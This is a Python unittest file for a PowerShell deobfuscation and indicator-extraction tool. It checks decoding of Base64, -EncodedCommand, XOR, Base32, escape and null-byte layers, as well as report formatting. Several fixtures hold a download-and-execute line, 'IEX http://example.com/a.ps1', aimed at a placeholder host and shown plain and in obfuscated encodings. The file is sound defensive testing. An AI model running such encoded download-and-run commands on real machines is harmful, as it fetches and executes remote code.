from __future__ import annotations

import base64
import json
import unittest
from pathlib import Path

from ps_deobfuscator.engine import (
    MAX_PAYLOAD_CHARS,
    PayloadTooLargeError,
    decode_payload,
    extract_iocs,
    format_txt_report,
    highlight_final,
)


FIXTURES = Path(__file__).parent / "fixtures" / "payloads.json"


class EngineDecodeTests(unittest.TestCase):
    def test_decodes_benign_fixture_payloads(self) -> None:
        cases = json.loads(FIXTURES.read_text(encoding="utf-8"))
        for case in cases:
            with self.subTest(case=case["name"]):
                result, iocs = decode_payload(case["payload"])
                layer_types = [layer.type for layer in result.layers]

                self.assertIn(case["expected"], result.final_text)
                self.assertTrue(
                    any(layer.startswith(case["layer_prefix"]) for layer in layer_types),
                    layer_types,
                )
                self.assertTrue(any(ioc.tipo == "URL" for ioc in iocs))
                self.assertTrue(any(ioc.tipo == "Suspicious PowerShell" for ioc in iocs))

    def test_extracts_iocs_without_misclassifying_dotnet_namespaces(self) -> None:
        rows = extract_iocs(
            "System.Net.WebClient downloads from http://example.com/a.ps1 and 192.0.2.10"
        )
        pairs = {(row.tipo, row.valor) for row in rows}

        self.assertIn((".NET Library", "System.Net.WebClient"), pairs)
        self.assertIn(("URL", "http://example.com/a.ps1"), pairs)
        self.assertIn(("IPv4", "192.0.2.10"), pairs)
        self.assertNotIn(("Domain", "System.Net.WebClient"), pairs)

    def test_report_contains_metadata_and_static_analysis_notice(self) -> None:
        result, iocs = decode_payload("SUVYIGh0dHA6Ly9leGFtcGxlLmNvbS9hLnBzMQ==")
        report = format_txt_report(result, iocs)

        self.assertIn("=== Veritas report ===", report)
        self.assertIn("Version:", report)
        self.assertIn("static defensive analysis", report)
        self.assertIn("=== Decode chain ===", report)
        self.assertIn("=== Final text ===", report)
        self.assertIn("IEX http://example.com/a.ps1", report)

    def test_highlight_escapes_html_before_markup(self) -> None:
        highlighted = highlight_final("<script>IEX http://example.com/a.ps1</script>")

        self.assertIn("&lt;script&gt;", highlighted)
        self.assertIn('class="hl-url"', highlighted)
        self.assertIn('class="hl-ps"', highlighted)

    def test_rejects_oversized_payloads(self) -> None:
        with self.assertRaises(PayloadTooLargeError):
            decode_payload("A" * (MAX_PAYLOAD_CHARS + 1))

    def test_decodes_short_enc_flag_with_mixed_case(self) -> None:
        payload = (
            'powershell.exe -EnC "'
            "SQBFAFgAIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQA="
            '"'
        )
        result, iocs = decode_payload(payload)

        self.assertIn("IEX http://example.com/a.ps1", result.final_text)
        self.assertTrue(any(layer.type.startswith("EncodedCommand") for layer in result.layers))
        self.assertTrue(any(ioc.tipo == "URL" for ioc in iocs))

    def test_decodes_single_byte_xor_payload(self) -> None:
        plaintext = "IEX http://example.com/a.ps1"
        key = 0x01
        payload = bytes(b ^ key for b in plaintext.encode("latin-1")).decode("latin-1")

        result, iocs = decode_payload(payload)
        layer_types = [layer.type for layer in result.layers]

        self.assertIn(plaintext, result.final_text)
        self.assertTrue(any(layer.startswith("XOR(") for layer in layer_types), layer_types)
        self.assertTrue(any(ioc.tipo == "URL" for ioc in iocs))

    def test_decodes_base32_payload(self) -> None:
        plaintext = "IEX http://example.com/a.ps1"
        payload = base64.b32encode(plaintext.encode("utf-8")).decode("ascii")

        result, iocs = decode_payload(payload)
        layer_types = [layer.type for layer in result.layers]

        self.assertIn(plaintext, result.final_text)
        self.assertTrue(any(layer.startswith("Base32") for layer in layer_types), layer_types)
        self.assertTrue(any(ioc.tipo == "URL" for ioc in iocs))

    def test_decodes_unicode_escape_payload(self) -> None:
        payload = r"\x49\x45\x58\x20\x68\x74\x74\x70\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f\x61\x2e\x70\x73\x31"
        result, iocs = decode_payload(payload)
        layer_types = [layer.type for layer in result.layers]

        self.assertIn("IEX http://example.com/a.ps1", result.final_text)
        self.assertIn("Unicode escape decode", layer_types)
        self.assertTrue(any(ioc.tipo == "URL" for ioc in iocs))

    def test_strips_null_bytes_before_recursive_decode(self) -> None:
        payload = "I\x00E\x00X\x00 \x00h\x00t\x00t\x00p\x00:\x00/\x00/\x00e\x00x\x00a\x00m\x00p\x00l\x00e\x00.\x00c\x00o\x00m\x00/\x00a\x00.\x00p\x00s\x001\x00"
        result, iocs = decode_payload(payload)

        self.assertIn("IEX http://example.com/a.ps1", result.final_text)
        self.assertTrue(any(ioc.tipo == "URL" for ioc in iocs))

    def test_decodes_powershell_variable_assignment_base64(self) -> None:
        plain = "hello world benign text without IOC"
        b64_payload = base64.b64encode(plain.encode("utf-8")).decode("ascii")

        payload = f'$enc="{b64_payload}"'
        result, iocs = decode_payload(payload)
        layer_types = [layer.type for layer in result.layers]

        self.assertGreaterEqual(len(result.layers), 2)
        self.assertTrue(
            any(layer.type.startswith("Embedded PS assignment") for layer in result.layers),
            layer_types,
        )
        self.assertIn(plain, result.final_text)
        self.assertEqual(len(iocs), 0)

    def test_decodes_powershell_variable_assignment_base64_single_quoted(self) -> None:
        plain = "hello world benign text without IOC"
        b64_payload = base64.b64encode(plain.encode("utf-8")).decode("ascii")

        payload = f"$enc = '{b64_payload}'"
        result, iocs = decode_payload(payload)

        self.assertGreaterEqual(len(result.layers), 2)
        self.assertTrue(
            any(layer.type.startswith("Embedded PS assignment") for layer in result.layers)
        )
        self.assertIn(plain, result.final_text)
        self.assertEqual(len(iocs), 0)

    def test_plaintext_that_matches_base64_alphabet_is_not_redecoded(self) -> None:
        # Regression: reported 2026-07-02. The decoded sentence, with spaces
        # stripped, is pure [A-Za-z0-9] and therefore "looks like" Base64;
        # the engine used to decode it again into garbage and then XOR it.
        plaintext = "Base64 esta decodificando corretamente"
        payload = base64.b64encode(plaintext.encode("utf-8")).decode("ascii")

        result, iocs = decode_payload(payload)

        self.assertEqual(result.final_text, plaintext)
        self.assertEqual(len(result.layers), 2)  # Raw input + single Base64 layer
        self.assertEqual(len(iocs), 0)

    def test_readable_plaintext_input_is_left_untouched(self) -> None:
        plaintext = "relatorio de conexao finalizado sem alertas"
        result, _ = decode_payload(plaintext)

        self.assertEqual(result.final_text, plaintext)
        self.assertEqual(len(result.layers), 1)

    def test_reports_decode_chain_section(self) -> None:
        result, iocs = decode_payload("SUVYIGh0dHA6Ly9leGFtcGxlLmNvbS9hLnBzMQ==")
        report = format_txt_report(result, iocs)

        self.assertIn("=== Decode chain ===", report)
        self.assertIn("1.", report)
        self.assertIn("2.", report)
        self.assertIn("Raw input", report)


if __name__ == "__main__":
    unittest.main()

